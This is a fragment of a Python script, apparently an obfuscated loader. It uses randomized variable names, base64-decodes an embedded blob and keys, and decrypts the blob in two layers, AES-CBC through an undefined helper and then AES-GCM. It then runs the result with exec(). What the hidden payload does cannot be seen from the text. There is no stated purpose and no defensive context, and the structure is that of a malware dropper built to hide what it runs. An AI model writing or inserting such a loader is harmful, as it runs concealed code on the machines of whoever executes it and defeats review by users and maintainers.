...
import base64 as JsJXlhjt
import hashlib as JsGKhpAO
...
JsvpJxfa = "uBNE5YjtymyvSmScU/9zJ7GUvKJ8oYKJznjQk2WxyyvSVKdw82GfDdmwzJiDEQQR"\
    "6nskSyRZZ8rnC3YIEKy1K36e+Yebr0AWyhHohPtItks="
Jsczocsk = JsJXlhjt.b64decode(JsvpJxfa)
JssZdDLH = JsJXlhjt.b64decode("52la34SCwlmX1mN0pRpWYaEfHW0wP0EHeooZkx2884g=")
JsrpXkkt = Jsczocsk[:16]
JsvqaeII = Jsczocsk[16:]
Jsczocsk = _Tf.dec_cbc(JssZdDLH, JsvqaeII, JsrpXkkt)
from Crypto.Cipher import AES as _A_1
JsAjflLZ = Jsczocsk
JsCzNCkG = JsJXlhjt.b64decode(JsAjflLZ)
JsBdpWiY = JsJXlhjt.b64decode("wg8JTo+ehJtzN9ixMC6XGyw9i+ouPBraOpDCs2Z1mZ8=")
_n_1 = JsCzNCkG[:12]
_c_1 = JsCzNCkG[12:-16]
_t_1 = JsCzNCkG[-16:]
_d_1 = _A_1.new(JsBdpWiY, _A_1.MODE_GCM, nonce=_n_1)
JsCzNCkG = _d_1.decrypt_and_verify(_c_1, _t_1)
exec(JsCzNCkG.decode())